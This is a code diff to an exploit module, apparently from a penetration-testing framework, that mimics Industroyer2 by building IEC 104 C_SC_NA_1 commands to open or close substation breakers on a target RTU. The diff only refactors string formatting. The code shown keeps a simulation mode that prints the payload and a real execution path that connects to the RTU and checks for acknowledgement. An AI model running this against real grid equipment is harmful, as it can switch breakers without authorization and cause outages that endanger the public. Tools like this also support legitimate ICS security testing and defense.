@@ -176,8 +176,8 @@ class Exploit(Exploit):
         i_frame = _build_apci_i_frame(0, 0, asdu)
         full_tx = _IEC104_STARTDT_ACT + i_frame
 
-        hex_asdu    = " ".join("{:02X}".format(b) for b in asdu)
-        hex_full    = " ".join("{:02X}".format(b) for b in full_tx)
+        hex_asdu    = " ".join(f"{b:02X}" for b in asdu)
+        hex_full    = " ".join(f"{b:02X}" for b in full_tx)
         state_str   = "CLOSE/ON" if self.state else "OPEN/OFF"
 
         if self.simulate:
@@ -192,40 +192,28 @@ class Exploit(Exploit):
             DestructiveGate.print_simulation(
                 description=(
                     "[Industroyer2 TTP] Would send IEC 104 C_SC_NA_1 ASDU to RTU at "
-                    "{target}:{port}: CA={ca}, IOA={ioa}, state={state_str}. "
+                    f"{self.target}:{self.port}: CA={self.ca}, IOA={self.ioa}, state={state_str}. "
                     "The real Industroyer2 sent these commands to open Ukrainian substation "
-                    "breakers without authorization. IEC 104 has NO built-in authentication.".format(
-                        target=self.target,
-                        port=self.port,
-                        ca=self.ca,
-                        ioa=self.ioa,
-                        state_str=state_str,
-                    )
+                    "breakers without authorization. IEC 104 has NO built-in authentication."
                 ),
                 payload_hex=hex_full,
                 payload_human=(
-                    "IEC 104 STARTDT + C_SC_NA_1: CA={} IOA={} SCO={} ({})".format(
-                        self.ca, self.ioa, self.state, state_str
-                    )
+                    f"IEC 104 STARTDT + C_SC_NA_1: CA={self.ca} IOA={self.ioa} SCO={self.state} ({state_str})"
                 ),
                 mitre_techniques=["T0855", "T0827", "T0831"],
             )
             print_info("\nASDU breakdown:")
-            print_info("  Type ID   : 0x{:02X} (C_SC_NA_1 — Single Command)".format(_TYPE_C_SC_NA_1))
+            print_info(f"  Type ID   : 0x{_TYPE_C_SC_NA_1:02X} (C_SC_NA_1 — Single Command)")
             print_info("  COT       : 0x06 (Activation)")
-            print_info("  CA        : {}".format(self.ca))
-            print_info("  IOA       : {}".format(self.ioa))
-            print_info("  SCO       : 0x{:02X} (SE=1, state={})".format(
-                (1 << 7) | (self.state & 0x01), state_str
-            ))
-            print_info("  ASDU hex  : {}".format(hex_asdu))
+            print_info(f"  CA        : {self.ca}")
+            print_info(f"  IOA       : {self.ioa}")
+            print_info(f"  SCO       : 0x{(1 << 7) | (self.state & 0x01):02X} (SE=1, state={state_str})")
+            print_info(f"  ASDU hex  : {hex_asdu}")
             return
 
         # Real execution path
         print_status(
-            "[Industroyer2 TTP] Connecting to IEC 104 RTU at {}:{} ...".format(
-                self.target, self.port
-            )
+            f"[Industroyer2 TTP] Connecting to IEC 104 RTU at {self.target}:{self.port} ..."
         )
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -253,20 +241,18 @@ class Exploit(Exploit):
                         if resp_asdu and resp_asdu[0] == _TYPE_C_SC_NA_1:
                             resp_cot = struct.unpack("<H", resp_asdu[2:4])[0] if len(resp_asdu) > 3 else 0
                             print_success(
-                                "C_SC_NA_1 CON received — COT=0x{:02X}. "
-                                "RTU acknowledged command: IOA={} state={}.".format(
-                                    resp_cot, self.ioa, state_str
-                                )
+                                f"C_SC_NA_1 CON received — COT=0x{resp_cot:02X}. "
+                                f"RTU acknowledged command: IOA={self.ioa} state={state_str}."
                             )
                         else:
                             print_success("I-frame response received — check RTU state.")
                     else:
-                        print_info("S/U-frame received — {}".format(resp.hex()))
+                        print_info(f"S/U-frame received — {resp.hex()}")
                 else:
                     print_status("No response — RTU may have executed silently.")
-            except socket.timeout:
+            except TimeoutError:
                 print_status("No response (timeout) — command may have been executed.")
 
             sock.close()
         except Exception as exc:
-            print_error("Error: {}".format(exc))
+            print_error(f"Error: {exc}")
